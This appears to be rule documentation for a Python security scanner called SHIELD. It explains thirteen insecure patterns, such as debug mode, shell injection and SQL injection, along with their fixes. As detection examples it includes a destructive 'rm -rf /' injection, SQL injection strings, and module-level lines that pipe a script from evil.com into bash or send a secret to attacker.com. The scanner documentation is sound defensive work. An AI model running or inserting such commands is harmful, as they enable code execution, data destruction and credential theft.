# SHIELD Security Rules

Complete reference for all 13 security rules.

Each rule has: what it detects, why it's dangerous, what SHIELD does, and the CWE reference.

---

## B201 — Flask Debug Mode
**Severity:** High | **CWE:** CWE-94

**What it detects:**
```python
app.run(debug=True)
```

**Why it's dangerous:**
Exposes the Werkzeug interactive debugger in the browser.
Any user who triggers an error gets a live Python console —
full Remote Code Execution on your server.

**What SHIELD does:**
```python
# Before
app.run(debug=True)

# After
app.run(debug=False, host='127.0.0.1', port=int(os.environ.get('PORT', 5000)))
```

---

## B602 — Shell Injection
**Severity:** High | **CWE:** CWE-78

**What it detects:**
```python
subprocess.run(cmd, shell=True)
subprocess.check_output(cmd, shell=True)
```

**Why it's dangerous:**
`shell=True` passes the command through the OS shell.
If `cmd` contains any user input, an attacker can inject
arbitrary shell commands: `ls; rm -rf /`

**What SHIELD does:**
```python
# Before
subprocess.run(cmd, shell=True)

# After
subprocess.run(cmd, shell=False)
ALLOWED_COMMANDS = {
    "status": ["/usr/bin/uptime"],
}
```

---

## B324 — Weak Hash Algorithm
**Severity:** High | **CWE:** CWE-327

**What it detects:**
```python
hashlib.md5(data)
hashlib.sha1(data)
```

**Why it's dangerous:**
MD5 and SHA1 are cryptographically broken.
GPU farms can crack MD5 hashes at billions per second.
Never use for passwords, signatures, or security-sensitive data.

**What SHIELD does:**
```python
# Before
hashlib.md5(data.encode())

# After
hashlib.sha256(data.encode(), usedforsecurity=False)
```

---

## B104 — Bind All Interfaces
**Severity:** Medium | **CWE:** CWE-605

**What it detects:**
```python
app.run(host='0.0.0.0')
```

**Why it's dangerous:**
Binds the server to all network interfaces — including public ones.
In production this exposes your app to the entire internet
without any firewall protection.

**What SHIELD does:**
```python
# Before
app.run(host='0.0.0.0')

# After
app.run(host=os.environ.get('HOST', '127.0.0.1'))
```

---

## B108 — Hardcoded Temp Directory
**Severity:** Medium | **CWE:** CWE-377

**What it detects:**
```python
UPLOAD_FOLDER = '/tmp/uploads'
```

**Why it's dangerous:**
/tmp is world-writable. Any user on the system can read,
modify, or delete files there. Symlink attacks can redirect
file operations to sensitive paths.

**What SHIELD does:**
```python
# Before
UPLOAD_FOLDER = '/tmp/uploads'

# After
UPLOAD_FOLDER = os.environ.get('UPLOAD_FOLDER', '/var/app/uploads')
```

---

## B105/B106 — Hardcoded Credentials
**Severity:** Low | **CWE:** CWE-259

**What it detects:**
```python
app.secret_key = 'mysecretkey'
SECRET_KEY = 'hardcodedvalue'
app.config['MAIL_PASSWORD'] = 'mypassword'
```

**Why it's dangerous:**
Hardcoded secrets end up in version control.
Anyone with repo access — including attackers who steal
the repo — gets your production credentials.

**What SHIELD does:**
```python
# Before
app.secret_key = 'mysecretkey'

# After
app.secret_key = os.environ.get('FLASK_SECRET_KEY')
```

---

## B311 — Insecure Random
**Severity:** Low | **CWE:** CWE-330

**What it detects:**
```python
token = random.randint(100000, 999999)
token = random.choice(chars)
```

**Why it's dangerous:**
Python's `random` module is not cryptographically secure.
Tokens generated with `random` are predictable and
can be brute-forced or predicted by attackers.

**What SHIELD does:**
```python
# Before (security context)
token = random.choice(chars)

# After
token = secrets.choice(chars)
```

---

## B101 — Assert Used
**Severity:** Low | **CWE:** CWE-703

**What it detects:**
```python
assert user.is_admin, "Not authorized"
```

**Why it's dangerous:**
Python's `-O` (optimize) flag removes all assert statements.
Security checks using assert are silently bypassed
in optimized production builds.

**What SHIELD does:**
Flags for manual review — replace with explicit `if` checks.

---

## CUSTOM_WERKZEUG — Weak Password Hash
**Severity:** Medium | **CWE:** CWE-916

**What it detects:**
```python
from werkzeug.security import generate_password_hash
hash = generate_password_hash(password)
```

**Why it's dangerous:**
`generate_password_hash` uses pbkdf2:sha256 by default.
GPU farms can test billions of pbkdf2 hashes per second.
bcrypt with rounds=12 limits this to thousands per second.

**What SHIELD does:**
```python
# Before
hash = generate_password_hash(password)

# After
import bcrypt
hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))
```

---

## CUSTOM_SQL_FSTRING — SQL Injection
**Severity:** High | **CWE:** CWE-89

**What it detects:**
```python
db.execute(f"SELECT * FROM users WHERE id = {user_id}")
db.execute("SELECT * FROM users WHERE name = " + name)
```

**Why it's dangerous:**
F-strings and concatenation in SQL allow attackers to
inject arbitrary SQL: `' OR '1'='1` bypasses authentication,
`'; DROP TABLE users; --` destroys data.

**What SHIELD does:**
Flags with a warning — auto-fix is too risky for SQL.
Replace with parameterized queries:
```python
db.execute('SELECT * FROM users WHERE id = ?', (user_id,))
```

---

## CUSTOM_EVAL_EXEC — Dynamic Execution
**Severity:** High | **CWE:** CWE-95

**What it detects:**
```python
eval(user_input)
exec(user_code)
```

**Why it's dangerous:**
`eval()` and `exec()` execute arbitrary Python code.
If any user input reaches these calls, the attacker
has full code execution on your server.

**What SHIELD does:**
Flags with a warning — never pass user input to eval/exec.

---

## CUSTOM_UNICODE_OBFUSCATION — Hidden Characters
**Severity:** High | **CWE:** CWE-116

**What it detects:**
Zero-width Unicode characters (U+200B, U+200C, U+FEFF etc.)
hidden inside string literals.

**Why it's dangerous:**
Used in supply chain attacks (TrapDoor campaign, May 2026)
to hide malicious code from code review.
The code looks clean to human eyes but executes differently.

**What SHIELD does:**
Flags with a warning — review the file immediately.

---

## CUSTOM_INSTALL_EXEC — Import-Time Execution
**Severity:** High | **CWE:** CWE-506

**What it detects:**
```python
# At module level (outside any function)
os.system('curl http://evil.com | bash')
requests.get('http://attacker.com/exfil?data=' + secret)
```

**Why it's dangerous:**
Code that runs at import/install time is the primary
mechanism for supply chain attacks. When you run
`pip install malicious-package`, this code executes immediately.

**What SHIELD does:**
Flags with a warning — move all execution inside functions
or `if __name__ == '__main__':` guard.